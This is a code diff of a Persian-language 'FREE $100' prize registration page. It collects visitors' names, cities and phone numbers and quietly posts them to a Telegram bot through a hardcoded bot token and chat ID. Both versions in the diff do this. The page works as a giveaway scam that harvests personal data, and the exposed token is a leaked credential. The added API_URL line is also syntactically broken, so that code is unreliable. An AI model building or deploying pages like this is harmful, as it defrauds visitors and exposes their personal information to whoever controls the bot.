@@ -1,127 +1,102 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-<meta charset="UTF-8">
-<title>ثبت‌نام هدیه</title>
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        background: #5f0bb0;
-        font-family: sans-serif;
-        direction: rtl;
-        text-align: center;
-        color: white;
-    }
-
-    .title {
-        margin-top: 40px;
-        font-size: 65px;
-        font-weight: bold;
-    }
-
-    .subtitle {
-        font-size: 40px;
-        margin-top: -15px;
-        color: #ffcc00;
-        font-weight: bold;
-    }
-
-    .form-box {
-        background: white;
-        color: black;
-        width: 80%;
-        max-width: 450px;
-        margin: 40px auto;
-        padding: 25px;
-        border-radius: 20px;
-        box-shadow: 0 0 20px rgba(0,0,0,0.2);
-    }
-
-    input {
-        width: 90%;
-        padding: 14px;
-        border-radius: 10px;
-        border: none;
-        background: #f2f2f2;
-        margin-top: 12px;
-        font-size: 16px;
-    }
-
-    .submit-btn {
-        width: 95%;
-        background: #10c148;
-        color: white;
-        border: none;
-        padding: 16px;
-        font-size: 20px;
-        border-radius: 12px;
-        margin-top: 20px;
-        cursor: pointer;
-    }
-
-    .success {
-        display: none;
-        margin-top: 20px;
-        font-size: 20px;
-        color: #00ff99;
-        font-weight: bold;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ثبت‌نام جایزه 100 دلاری</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #f5f5f5;
+            text-align: center;
+            padding: 30px;
+        }
+        .card {
+            max-width: 420px;
+            margin: auto;
+            background: #fff;
+            padding: 25px;
+            border-radius: 14px;
+            box-shadow: 0 0 12px rgba(0,0,0,0.1);
+        }
+        h2 { color: #e67e22; }
+        input {
+            width: 100%;
+            margin-top: 10px;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+        }
+        button {
+            width: 100%;
+            margin-top: 15px;
+            padding: 12px;
+            background: #e67e22;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 17px;
+        }
+        #statusMessage {
+            margin-top: 15px;
+            font-weight: bold;
+        }
+        .success { color: green; }
+        .error { color: red; }
+    </style>
 </head>
-
 <body>
 
-<div class="title">FREE $100 🎁</div>
-<h2>فرم ثبت‌نام</h2>
-
-<div class="form-box">
-    <h3>فرم ثبت‌نام</h3>
-
-    <form id="giftForm">
-        <input type="text" id="name" placeholder="نام و نام خانوادگی" required>
-        <input type="text" id="city" placeholder="شهر" required>
-        <input type="text" id="phone" placeholder="شماره موبایل" required>
-        <button class="submit-btn" type="submit">ثبت</button>
-    </form>
-
-    <div class="success">🎉 ثبت نام با موفقیت انجام شد</div>
+<div class="card">
+    <h2>🎁 ثبت‌نام جایزه 100 دلاری</h2>
+    <input id="fullname" placeholder="نام و نام خانوادگی">
+    <input id="city" placeholder="شهر">
+    <input id="phone" placeholder="شماره تلفن">
+    <button onclick="sendForm()">ثبت</button>
+    <p id="statusMessage"></p>
 </div>
 
 <script>
-document.getElementById("giftForm").addEventListener("submit", function(e){
-    e.preventDefault();
+    const BOT_TOKEN = "8014203833:AAEcIJ7Xa4UqtzbGf9C79GDa2TrBC_ydhNM";
+    const CHAT_ID = "398797799";
+    const API_URL = "https://api.telegram.org/bot" + 8014203833:AAEcIJ7Xa4UqtzbGf9C79GDa2TrBC_ydhNM + "/sendMessage";
 
-    let name = document.getElementById("name").value;
-    let city = document.getElementById("city").value;
-    let phone = document.getElementById("phone").value;
+    function sendForm() {
+        const name = document.getElementById("fullname").value.trim();
+        const city = document.getElementById("city").value.trim();
+        const phone = document.getElementById("phone").value.trim();
+        const statusEl = document.getElementById("statusMessage");
 
-    let BOT_TOKEN = "8014203833:AAEcIJ7Xa4UqtzbGf9C79GDa2TrBC_ydhNM";   // ← توکن ربات
-    let CHAT_ID = "398797799";       // ← چت آیدی عددی
+        statusEl.textContent = "";
+        statusEl.className = "";
 
-    let text =
-        "📩 فرم جدید ثبت شد:\n\n" +
-        "👤 نام: " + name + "\n" +
-        "🏙️ شهر: " + city + "\n" +
-        "📞 موبایل: " + phone;
+        if (!name || !city || !phone) {
+            statusEl.textContent = "⚠ لطفاً همه فیلدها را کامل وارد کنید";
+            statusEl.className = "error";
+            return;
+        }
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text
+        const text = `🎁 فرم جدید ثبت‌نام جایزه:\n👤 نام: ${name}\n🏙 شهر: ${city}\n📞 تلفن: ${phone}`;
+
+        fetch(API_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         })
-    });
-
-    document.querySelector(".success").style.display = "block";
-});
+        .then(() => {
+            statusEl.textContent = "✔ ثبت نام با موفقیت انجام شد";
+            statusEl.className = "success";
+            document.getElementById("fullname").value = "";
+            document.getElementById("city").value = "";
+            document.getElementById("phone").value = "";
+        })
+        .catch(() => {
+            statusEl.textContent = "❌ ارسال انجام نشد، دوباره تلاش کنید";
+            statusEl.className = "error";
+        });
+    }
 </script>
 
 </body>
 </html>
-
-
-
-
-
